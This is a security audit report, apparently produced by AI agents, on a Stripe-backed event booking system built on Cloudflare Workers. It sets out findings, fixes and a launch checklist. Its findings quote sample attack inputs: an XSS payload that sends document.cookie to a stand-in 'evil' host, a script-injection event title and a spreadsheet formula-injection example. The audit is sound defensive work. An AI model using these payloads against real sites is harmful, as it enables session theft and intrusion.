# Security Audit — 2026-04-21

**Target:** Air Action Sports booking system
**Scope:** Full codebase (`worker/`, `src/`, `migrations/`, `scripts/`, git history) + live deploy at https://air-action-sports.bulletbiter99.workers.dev
**Stack:** Cloudflare Workers + D1 + Stripe + Resend + R2, Hono router
**Auditor:** 5 parallel specialist agents (secrets/deps, auth, injection, infra, business logic)
**Context:** Pre-launch audit; Stripe in sandbox; Operation Nightfall (first live event) is 2026-05-09; real payments start shortly.

---

## Executive summary

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 9 |
| Medium | 13 |
| Low | 8 |
| Informational | 4 |

### Go/no-go recommendation for Stripe live cutover

**🔴 NO-GO as-is.** There are two Critical findings and several High findings that are exploitable against the live system today. The **minimum remediation set** before flipping Stripe to live:

1. Fix the email-template XSS (CRIT-2) — public booking form sends unescaped attacker-controlled strings to your admin inbox
2. Fix the CORS wildcard (CRIT-1) — admin endpoints respond to any origin
3. Add Stripe refund idempotency key (HIGH-8) — otherwise a browser retry refunds twice
4. Add rate limiting to `/login`, `/forgot-password`, `/checkout`, `/bookings/:token`, `/waivers/:qrToken` (HIGH-3)
5. Fix the HTMLRewriter XSS on `/events/:slug` (HIGH-5) — a compromised manager can own the `.workers.dev` origin
6. Add manual-booking capacity check (HIGH-9)
7. Add security response headers (HIGH-4) — HSTS, nosniff, frame-ancestors at minimum

Estimated total effort: **S + S + S + M + S + S + M ≈ 1 focused workday.**

Everything else can follow post-launch, but the above are genuine "don't process real credit cards until this is done" issues.

---

## CRITICAL findings

### CRIT-1 — Wildcard CORS on admin + webhook endpoints
- **Location:** [worker/index.js:25-29](worker/index.js:25)
- **Evidence:** `app.use('/api/*', cors({ origin: '*', ... }))` applied to every route including `/api/admin/*` and `/api/webhooks/stripe`.
- **Impact:** Any origin can read GET responses from non-cookie admin endpoints. SameSite=Lax currently blocks the worst cookie-bearing attacks, but `*` removes the origin-allowlist defense-in-depth and is wrong policy for a payments app. `/api/webhooks/stripe` should reject CORS entirely.
- **Fix:** Per-route allowlist. Public API → `origin: env.SITE_URL`; admin → `origin: env.SITE_URL, credentials: true`; webhooks → no CORS middleware. Reduce `allowMethods` per route.
- **Effort:** S

### CRIT-2 — Stored XSS via unescaped `{{vars}}` in HTML email templates
- **Location:** [worker/lib/templates.js:18-24](worker/lib/templates.js:18) (`substitute`); variables sourced in [worker/lib/emailSender.js:19-170](worker/lib/emailSender.js:19)
- **Evidence:** `str.replace(/\{\{(\w+)\}\}/g, (_, key) => String(vars[key]))` — no HTML escape. Attacker-controlled sources include `player_name` (= public booking `fullName`), `event_name`, `player_email`, `player_phone`, `inviter_name`, `display_name`.
- **Impact:** A public booker submits `fullName = "<img src=x onerror=fetch('https://evil/?c='+document.cookie)>"`. It lands verbatim in the admin-notify email and the customer's confirmation. In preview panes and older clients this executes; in all clients it is a phishing primitive — attacker can insert `<a href="https://phish">Click to verify</a>` into admin email.
- **Fix:** Add `escapeHtml()` helper and apply to every variable in the HTML path. Keep plain-text path raw. Optionally add `{{{raw}}}` escape hatch for template-level HTML (e.g. already-built links).
- **Effort:** S

---

## HIGH findings

### HIGH-1 — `.gitignore` missing `.env`, `.wrangler/`, `*.sqlite` coverage
- **Location:** [.gitignore:1-4](.gitignore:1)
- **Evidence:** Current file is only `node_modules/`, `static-backup/`, `.claude/`, `dist/`. No `.env`, `.env.*`, `.dev.vars`, `.wrangler/`, or `*.sqlite`.
- **Impact:** A future `.env` or `.dev.vars` for local wrangler dev will silently stage. `.wrangler/` caches D1 data and session bindings locally.
- **Fix:** Add `.env`, `.env.*`, `!.env.example`, `.dev.vars`, `.wrangler/`, `*.sqlite`, `*.sqlite3`.
- **Effort:** S

### HIGH-2 — `randomId()` modulo bias
- **Location:** [worker/lib/ids.js:5-13](worker/lib/ids.js:5)
- **Evidence:** `bytes[i] % 62` with 256-byte range. First 8 symbols `0-7` are ~1.35× more likely than others.
- **Impact:** Token entropy reduced but not broken (40-char reset ≈ 230 bits, 14-char booking ≈ 82 bits). Defense-in-depth issue, not exploitable today.
- **Fix:** Rejection sampling (`bytes[i] < 248`) or use `base64url(crypto.getRandomValues(Uint8Array(N)))`.
- **Effort:** S

### HIGH-3 — No rate limiting on ANY endpoint
- **Location:** No rate limit binding in [wrangler.toml](wrangler.toml); no KV-backed limiter anywhere.
- **Evidence:** `/login` has no lockout; `/forgot-password` can be used for Resend-reputation abuse; `/verify-invite/*` and `/verify-reset-token/*` are online token oracles; `/api/bookings/:token` and `/api/waivers/:qrToken` are enumerable at network line-rate; `/bookings/checkout` can be flooded to create pending seat holds (see MED-3).
- **Impact:** Credential stuffing, email-spam-as-a-service, seat DoS, token enumeration.
- **Fix:** Add Cloudflare Workers Rate Limiting binding (or a KV-backed token bucket). Priority order:
  1. `/api/admin/auth/login` — 5/min/IP, 20/hour/IP
  2. `/api/admin/auth/forgot-password` — 3/min/IP, 10/hour/IP + 3/hour/email
  3. `/api/admin/auth/verify-invite/*`, `/api/admin/auth/verify-reset-token/*` — 10/min/IP
  4. `/api/bookings/checkout` — 10/min/IP
  5. `/api/bookings/:token`, `/api/waivers/:qrToken` — 30/min/IP
- **Effort:** M

### HIGH-4 — No security response headers emitted by the app
- **Location:** [worker/index.js](worker/index.js) (no middleware emits any)
- **Evidence:** Grep of `worker/` for HSTS, CSP, X-Frame, Referrer-Policy, Permissions-Policy returns zero hits. `*.workers.dev` does not auto-inject these; they must be set in code.
- **Impact:** Clickjacking (no X-Frame-Options), XSS exfiltration unconstrained (no CSP), TLS stripping risk (no HSTS), booking tokens leaked in `Referer` to third parties.
- **Fix:** Global middleware at top of `worker/index.js` setting `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`), `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(self), microphone=(), geolocation=()`, and a CSP (start: `default-src 'self'; img-src 'self' data: https:; script-src 'self' https://js.stripe.com; frame-src https://js.stripe.com https://checkout.stripe.com; connect-src 'self' https://api.stripe.com; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`). Remove Peek widget first (else allowlist it).
- **Effort:** M

### HIGH-5 — Stored XSS in OG/meta HTMLRewriter on `/events/:slug`
- **Location:** [worker/index.js:166-203](worker/index.js:166) (`rewriteEventOg`)
- **Evidence:** `el.setInnerContent(title)` (no `{ html: false }` flag) — the `<title>` element is written with HTML interpretation. Admin/manager sets event title to `</title><script>alert(1)</script>` and it executes for every visitor. `setAttribute` calls are safe (attribute-encoded by platform).
- **Impact:** Manager-level insider or compromised manager account owns the `.workers.dev` origin — same origin as admin session cookies. Session theft primitive.
- **Fix:** `el.setInnerContent(title, { html: false })`. Also tighten the PUT `slug` update in [worker/routes/admin/events.js:35](worker/routes/admin/events.js:35) to enforce the slug regex from `ids.js:slugify` (create-time enforces; PUT does not).
- **Effort:** S

### HIGH-6 — Email header/subject injection via owner-editable template subject
- **Location:** [worker/routes/admin/emailTemplates.js:86-88](worker/routes/admin/emailTemplates.js:86); [worker/lib/email.js:5-22](worker/lib/email.js:5)
- **Evidence:** Template `subject` stored via `String(body.subject).trim()` only — no CRLF strip. Rendered into Resend's JSON-serialized subject. Resend escapes in JSON, but the subject line variables via `substitute()` also inherit from this path.
- **Impact:** Owner role can inject newlines in subject; currently Resend will likely reject but defense-in-depth is missing. Combined with CRIT-2, any `{{var}}` in subject is also unescaped.
- **Fix:** In `templates.js`, strip `\r\n` from variable values before substitution. Validate `subject` on PUT.
- **Effort:** S

### HIGH-7 — Waiver signature-match bypass via admin rename
- **Location:** [worker/routes/admin/attendees.js:126-177](worker/routes/admin/attendees.js:126); check at [worker/routes/waivers.js:66-75](worker/routes/waivers.js:66)
- **Evidence:** Waiver signing enforces `signature == first_name + " " + last_name`. `PUT /api/admin/attendees/:id` lets staff rewrite name fields AFTER waiver is signed; stored waiver signature is not re-validated or invalidated.
- **Impact:** Ticket holder "Alex B" signs waiver; staff renames to "Jordan C" on event day; "Jordan" walks in on a waiver that doesn't legally name them. Undermines the core waiver control.
- **Fix:** If `existing.waiver_id` is set and first/last name change, either flip `waiver_id = NULL` forcing re-sign, or reject with 409. At minimum, audit `action='attendee.renamed_after_waiver'` with old+new values.
- **Effort:** S

### HIGH-8 — Refund lacks Stripe idempotency key; concurrent refund = double refund
- **Location:** [worker/routes/admin/bookings.js:219-263](worker/routes/admin/bookings.js:219); [worker/lib/stripe.js:67-72](worker/lib/stripe.js:67)
- **Evidence:** `issueRefund` posts to `/v1/refunds` without `Idempotency-Key` header. The DB `status !== 'paid'` guard doesn't protect against concurrent clicks.
- **Impact:** $80 booking refunded $160 if two managers click refund simultaneously or the browser retries on slow response. Real money loss.
- **Fix:** Add `Idempotency-Key: refund_${bookingId}` header in `stripeFetch`. Flip booking status to `'refunding'` *before* the Stripe call (compare-and-swap). Reject refund if `stripe_payment_intent` starts with `cash_` (prevents MED-7).
- **Effort:** S

### HIGH-9 — Manual booking bypasses capacity enforcement
- **Location:** [worker/routes/admin/bookings.js:84-215](worker/routes/admin/bookings.js:84)
- **Evidence:** `POST /api/admin/bookings/manual` never calls `checkTicketInventory`. Increments `ticket_types.sold` unconditionally (line 197-201).
- **Impact:** Manager creating walk-in/cash bookings can oversell beyond `ticket_types.capacity`. Hard to unwind via refunds.
- **Fix:** Run same `checkTicketInventory` before insert; return 409 with remaining count.
- **Effort:** S

---

## MEDIUM findings

### MED-1 — `npm audit` could not run in audit sandbox
- **Location:** [package.json](package.json)
- **Evidence:** `npm audit` requires network; audit-time environment blocked it. No obviously stale top-level packages.
- **Action:** User runs `npm audit --omit=dev` and `npm audit` locally; any High/Critical in runtime deps blocks launch.
- **Effort:** S (to run)

### MED-2 — All dependency versions caret-ranged, not pinned
- **Location:** [package.json:12-32](package.json:12)
- **Evidence:** Every entry `^x.y.z`. Every fresh `npm install` can pull newer minors.
- **Impact:** Supply-chain risk — compromised minor release picked up on next deploy.
- **Fix:** Use `npm ci` (not `install`) in deploy; consider pinning runtime deps (`hono`, `qrcode`, `docx`, `@zxing/browser`, `react-router-dom`, `react-helmet-async`) to exact versions.
- **Effort:** S

### MED-3 — Pending-booking seat reservation DoS
- **Location:** [worker/routes/bookings.js:25-60,132-299](worker/routes/bookings.js:25)
- **Evidence:** `POST /api/bookings/checkout` inserts pending bookings; 30-min reservation window; no background sweep; unauthenticated.
- **Impact:** Bot refreshes pending bookings every 29 min, event appears sold-out.
- **Fix:** Rate-limit `/checkout` (HIGH-3); background-cancel expired Stripe sessions; shorten hold to 10 min.
- **Effort:** M

### MED-4 — Cron reminder has no `LIMIT`; unbounded CPU risk
- **Location:** [worker/index.js:69-109](worker/index.js:69)
- **Evidence:** SELECT returns all matching bookings; serial awaited sends. `scheduled()` CPU budget ~30s; throughput ~60-150 emails/sweep.
- **Impact:** Large backlogs miss the window.
- **Fix:** Add `LIMIT 100` to SELECT; parallelize with `Promise.allSettled` in batches.
- **Effort:** S

### MED-5 — Cron send-then-persist race can duplicate reminder emails
- **Location:** [worker/index.js:85-102](worker/index.js:85)
- **Evidence:** `await sender()` happens before `UPDATE bookings SET reminder_sent_at`. If Worker evicted between send and persist, next tick re-sends.
- **Fix:** Write sentinel `reminder_sent_at` FIRST, then send, then confirm. OR pass Resend `Idempotency-Key: rem24_${bookingId}`.
- **Effort:** S

### MED-6 — `/uploads/:key` streams arbitrary R2 keys without prefix scoping
- **Location:** [worker/index.js:135-144](worker/index.js:135); [worker/routes/admin/uploads.js:40-48](worker/routes/admin/uploads.js:40)
- **Evidence:** `env.UPLOADS.get(key)` on any user-supplied key. Uploads written to `events/*` but GET has no prefix enforcement. Content-Type trusted from object metadata.
- **Impact:** Any future non-event upload to this bucket becomes a URL-guess away from public. Mostly defense-in-depth since keys are 96-bit random.
- **Fix:** Reject keys not matching `^events/[a-zA-Z0-9_-]+\.[a-z]+$`; force Content-Type from extension, not metadata; add `X-Content-Type-Options: nosniff`.
- **Effort:** S

### MED-7 — SVG/polyglot upload not blocked; Content-Type trusted from uploader
- **Location:** [worker/routes/admin/uploads.js:32-48](worker/routes/admin/uploads.js:32); [worker/index.js:140](worker/index.js:140)
- **Evidence:** `ALLOWED_TYPES` checks browser-supplied `file.type` header; no magic-byte sniff. Manager can relabel SVG (or HTML) as `image/png`. Served content-type from object metadata.
- **Impact:** Manager-role stored XSS on `.workers.dev` origin (same-origin as admin cookie).
- **Fix:** Magic-byte check (JPEG `FF D8 FF`, PNG `89 50 4E 47`, WebP `52 49 46 46 ... WEBP`, GIF `47 49 46 38`). Force Content-Type from extension on serve. Consider serving uploads from separate hostname.
- **Effort:** M

### MED-8 — No JSON body size cap on any endpoint
- **Location:** Every `await c.req.json()` (bookings.js, admin/*)
- **Evidence:** No length check; Cloudflare default is 100MB. `fullName`, `password`, `notes`, `signature`, `customAnswers` values accept arbitrary length.
- **Impact:** CPU exhaustion via oversized JSON on unauthenticated `/checkout`, `/quote`, `/waivers/:qrToken`. Giant password → giant PBKDF2 input.
- **Fix:** Wrap `c.req.text()` with length cap (50KB default), parse after. Field-level caps (`fullName ≤ 120`, `password ≤ 256`, `notes ≤ 2000`, `signature ≤ 200`, attendees `length ≤ 50`).
- **Effort:** M

### MED-9 — Password change / reset does not invalidate existing sessions
- **Location:** [worker/lib/session.js](worker/lib/session.js); [worker/routes/admin/auth.js](worker/routes/admin/auth.js) (reset flow)
- **Evidence:** Session is HMAC cookie only; no `pwd_v`/session-version check in `requireAuth`. Password change bumps hash but cookies issued before remain valid for 7-day TTL.
- **Impact:** Post-compromise password reset doesn't kill stolen cookies.
- **Fix:** Add `pwd_v` column to `users`; include in session payload; increment on reset/change; check equality in `requireAuth`.
- **Effort:** M

### MED-10 — `logout` only clears client cookie; no server-side revocation
- **Location:** [worker/routes/admin/auth.js:69-72](worker/routes/admin/auth.js:69); [worker/lib/session.js:35-37](worker/lib/session.js:35)
- **Fix:** Same `pwd_v` scheme as MED-9; bump on logout.
- **Effort:** M (combines with MED-9)

### MED-11 — Owner bootstrap race on `/api/admin/auth/setup`
- **Location:** [worker/routes/admin/auth.js:17-47](worker/routes/admin/auth.js:17)
- **Evidence:** TOCTOU — count check not atomic with INSERT. Not exploitable today (owner exists), but a future DB reset window is attacker-winnable.
- **Fix:** `INSERT ... WHERE NOT EXISTS (SELECT 1 FROM users)`, verify rowcount after; or bootstrap lock table.
- **Effort:** S

### MED-12 — Webhook signature rotation: only last `v1=` entry parsed
- **Location:** [worker/lib/stripe.js:80-118](worker/lib/stripe.js:80)
- **Evidence:** `Object.fromEntries(pairs)` keeps last duplicate key. During Stripe secret rotation, both old and new `v1=` signatures ship in one `Stripe-Signature`; current code drops one.
- **Impact:** ~50% of webhook deliveries fail during the rotation window — missed bookings flipped to paid.
- **Fix:** Split on `,`, filter entries starting with `v1=`, try each against the secret.
- **Effort:** S

### MED-13 — Cash-booking refund reaches Stripe with invalid PI; leaks error text
- **Location:** [worker/routes/admin/bookings.js:225-240](worker/routes/admin/bookings.js:225)
- **Evidence:** Cash bookings have `stripe_payment_intent = 'cash_<id>'`. Guard on line 228 passes; Stripe returns "No such payment_intent"; line 239 returns `` `Stripe refund failed: ${err.message}` `` verbatim.
- **Impact:** Info disclosure of Stripe error structure; confirms live/test mode to unauthenticated-after-compromise.
- **Fix:** Early-reject if `stripe_payment_intent.startsWith('cash_')` → 400 "Cash booking — refund out-of-band".
- **Effort:** XS

---

## LOW findings

### LOW-1 — `/forgot-password` timing side channel (account enumeration)
- **Location:** [worker/routes/admin/auth.js:83-121](worker/routes/admin/auth.js:83)
- **Evidence:** `if (user)` branch does DB insert + email send; ~5-20ms delta measurable.
- **Fix:** Move insert into `waitUntil`, or run a dummy insert on the miss path.
- **Effort:** S

### LOW-2 — Booking success URL puts lookup token in `Referer`
- **Location:** [worker/routes/bookings.js:277](worker/routes/bookings.js:277)
- **Evidence:** `${SITE_URL}/booking/success?token=${bookingId}` — booking id is the lookup token.
- **Impact:** Third-party scripts on /booking/success receive token via Referer. Mitigated by HIGH-4 (Referrer-Policy).
- **Fix:** Either add `Referrer-Policy` (part of HIGH-4) or separate booking_id from a rotatable lookup_token.
- **Effort:** S (with HIGH-4)

### LOW-3 — `/api/admin/bookings/:id` distinguishes 404 vs 401
- **Location:** [worker/routes/admin/bookings.js:48-77](worker/routes/admin/bookings.js:48)
- **Evidence:** Unauth → 401; auth + bad id → 404. Existence-leak for a compromised staff account.
- **Impact:** Minimal; booking IDs are 83-bit random.
- **Fix:** Not urgent.
- **Effort:** —

### LOW-4 — Log injection risk in a few `console.log` template literals
- **Location:** [worker/routes/webhooks.js:75](worker/routes/webhooks.js:75), [worker/index.js:221](worker/index.js:221)
- **Evidence:** User-derived values interpolated via template literals. All current sources are server-trusted (Stripe session IDs, internal errors).
- **Fix:** No action required; consider `safeLog()` wrapper later.
- **Effort:** S

### LOW-5 — CSV formula injection in roster export
- **Location:** [worker/routes/admin/events.js:230-235](worker/routes/admin/events.js:230) (`csvCell`)
- **Evidence:** Correctly escapes for CSV parsing but not for spreadsheet formulas. Player named `=HYPERLINK(...)` executes in Excel when roster CSV opened.
- **Fix:** Prefix cells starting with `=`/`+`/`-`/`@` with `'`.
- **Effort:** XS

### LOW-6 — HTMLRewriter D1 lookup per unknown `/events/:slug` request
- **Location:** [worker/index.js:147-206](worker/index.js:147)
- **Evidence:** Every request matching `/events/<anything>` runs a D1 SELECT uncached.
- **Impact:** Cheap bill/D1-read amplification.
- **Fix:** In-memory LRU cache in module scope (60s TTL, positive + negative); or Cloudflare cache API with `s-maxage=60, stale-while-revalidate=300`.
- **Effort:** S

### LOW-7 — Last-owner deactivate race in `users.js`
- **Location:** [worker/routes/admin/users.js:153-163](worker/routes/admin/users.js:153)
- **Evidence:** Count check not transactional. Two concurrent PUTs by two owners mutually deactivating could both pass the `COUNT(*)=1` gate.
- **Impact:** Narrow window; both owners locked out.
- **Fix:** Wrap in explicit transaction with repeatable-read, or use `UPDATE ... WHERE (SELECT COUNT(*) FROM users WHERE role='owner' AND active=1 AND id != :id) >= 1`.
- **Effort:** S

### LOW-8 — Error verbosity in Stripe session/refund paths
- **Location:** [worker/routes/admin/bookings.js:239](worker/routes/admin/bookings.js:239), [worker/routes/bookings.js:287-288](worker/routes/bookings.js:287)
- **Fix:** Log full error; return generic message to client.
- **Effort:** XS

---

## INFORMATIONAL

- **INFO-1** Cloudflare API token scope — user must verify in dashboard that `.claude/.env` token is scoped to Workers + D1 + R2 on this account only (not Global API Key).
- **INFO-2** Staff role has no per-event scoping (single-tenant design) — confirm this matches your operational model.
- **INFO-3** `admin_sessions` table is unused (legacy); harmless but prune to reduce confusion.
- **INFO-4** `HTMLRewriter setAttribute` calls are safe (auto-encoded by platform); only `setInnerContent` needs the `{html:false}` flag fix (HIGH-5).

---

## Clean checks (audited and found fine)

- **No secrets in the built frontend bundle** (`dist/`). No `sk_live_`, `sk_test_`, `RESEND`, `SESSION_SECRET`, hardcoded Authorization headers.
- **No secrets in source** (`src/`, `worker/`, `migrations/`, `scripts/`, `wrangler.toml`). Only proper `env.*` runtime bindings.
- **Git history clean.** `.env`, `.claude/`, `.claude/.env` never committed. Historical `wrangler.toml` versions never inlined secrets.
- **No SQL injection.** All 22 route files use `.bind()` parameterization consistently. Dynamic SET/WHERE columns built from server-controlled whitelists. IN-clause placeholders generated from internal ID arrays.
- **No `dangerouslySetInnerHTML` / `innerHTML =` in `src/`.** React default escaping in effect.
- **Session cookie flags correct:** `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=7d`.
- **HMAC signing** (`session.js`): SHA-256 via Web Crypto, constant-time compare on verify.
- **PBKDF2:** 100k iterations (Workers runtime cap), 16-byte per-user random salt, SHA-256, constant-time hash compare.
- **Password reset flow:** single-use (used_at), 1-hour TTL, other pending tokens invalidated on successful reset.
- **Invite flow:** single-use (consumed_at), 7-day TTL, email bound to invite (Alice can't accept Bob's).
- **Owner self-lockout guards** present (can't demote self, can't deactivate self, can't demote last owner).
- **Webhook signature verified before any DB work.** `status='paid'` guard gives idempotency on replay.
- **Audit log** append-only (no UPDATE/DELETE endpoint); actor always from session; always writes after action success.
- **Price integrity:** `/checkout` computes totals from DB-derived `ticket_types`, not client input. Promo code resolved server-side.
- **Authorization matrix** verified across all 45+ admin routes: every mutation has correct `requireRole`. No route reads `user_id`/`role` from body.
- **QR/booking token entropy:** 83-143 bits depending on field. Not enumerable by brute force (but rate-limit still wanted — HIGH-3).
- **Waiver signature normalization:** trim + lowercase + collapse-whitespace. Reasonable.
- **`wrangler.toml` clean:** no secrets in `[vars]`, `run_worker_first = true`, compatibility_date fresh, cron `*/15 * * * *` correct.
- **Global error handler** returns generic 500s; no stack trace leakage.

---

## Out-of-scope / Deferred to user verification

1. **Live curl probes.** The audit agents' bash sandbox blocked curl against the live site. User should verify:
   ```
   curl -I https://air-action-sports.bulletbiter99.workers.dev/
   curl -I https://air-action-sports.bulletbiter99.workers.dev/admin/login
   curl -H "Origin: https://evil.example.com" -I https://air-action-sports.bulletbiter99.workers.dev/api/admin/bookings
   ```
   Compare headers against HIGH-4 list.
2. **`npm audit`** — see MED-1. User to run locally and report runtime deps with High/Critical CVEs.
3. **Cloudflare API token scope** — see INFO-1. Verify in dashboard.
4. **R2 bucket public access** — verify in Cloudflare dashboard: `air-action-sports-uploads` → Settings → Public Access = Disabled, no custom public domain.
5. **Stripe Dashboard** — before live cutover, also need to: rotate to live keys, re-point webhook endpoint to `/api/webhooks/stripe` in live mode, regenerate `STRIPE_WEBHOOK_SECRET`.

---

## Appendix: Fix-ordering checklist (pre-launch)

**Block Stripe live until done:**
- [ ] CRIT-2 email template `escapeHtml` (S)
- [ ] CRIT-1 CORS per-route allowlist (S)
- [ ] HIGH-8 Stripe refund idempotency key (S)
- [ ] HIGH-5 HTMLRewriter `{html:false}` + slug PUT regex (S)
- [ ] HIGH-3 rate limiting on login/forgot-password/checkout/token-lookup (M)
- [ ] HIGH-9 manual-booking capacity check (S)
- [ ] HIGH-4 security response headers (M)
- [ ] HIGH-1 `.gitignore` additions (S)

**Strongly recommended before real customers:**
- [ ] MED-8 JSON body size caps (M)
- [ ] MED-12 webhook multi-signature handling (S)
- [ ] HIGH-7 waiver-rename post-sign guard (S)
- [ ] HIGH-6 subject CRLF strip (S)
- [ ] MED-1 `npm audit` review (S)

**Post-launch hardening:**
- [ ] MED-3 pending-booking DoS sweep (M)
- [ ] MED-6 /uploads/:key prefix scoping (S)
- [ ] MED-7 magic-byte upload check (M)
- [ ] MED-9 + MED-10 session invalidation on password change/logout (M combined)
- [ ] MED-4 + MED-5 cron sweep LIMIT + idempotency (S each)
- [ ] MED-11 owner bootstrap race hardening (S)
- [ ] HIGH-2 randomId rejection sampling (S)
- [ ] LOW-1 forgot-password timing (S)
- [ ] LOW-5 CSV formula-injection prefix (XS)
- [ ] LOW-6 HTMLRewriter cache (S)
- [ ] LOW-7 last-owner race (S)
